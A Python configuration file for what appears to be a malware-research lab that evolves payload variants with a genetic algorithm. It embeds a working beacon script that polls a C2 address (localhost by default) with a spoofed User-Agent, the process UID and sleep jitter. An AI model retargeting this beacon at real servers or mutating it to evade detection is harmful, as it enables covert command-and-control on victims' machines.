# Lab Configuration

import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LAB_DIR = os.path.join(BASE_DIR, "lab_samples")
EXPORT_FILE = os.path.join(BASE_DIR, "feed_export.json")

# Genetic Algorithm Settings
POPULATION_SIZE = 20
GENERATIONS = 10
MUTATION_RATE = 0.5

# Base "Malware" Payload (Synthetic Beacon)
# This is a functional script that attempts to beacon to a C2.
# It uses real libraries and tradecraft (User-Agents, Sleep).
# Defaulting to localhost for safety, but structure is realistic.
BASE_PAYLOAD = """
import urllib.request
import time
import random
import os

C2_URL = "http://127.0.0.1:8080/beacon"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
SLEEP_MIN = 5
SLEEP_MAX = 10

def beacon():
    try:
        req = urllib.request.Request(C2_URL)
        req.add_header('User-Agent', USER_AGENT)
        # Add basic system info to make it "real"
        uid = os.getuid() if hasattr(os, 'getuid') else 0
        req.add_header('X-UID', str(uid))

        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except Exception:
        return 0

if __name__ == "__main__":
    while True:
        status = beacon()
        jitter = random.randint(SLEEP_MIN, SLEEP_MAX)
        time.sleep(jitter)
"""
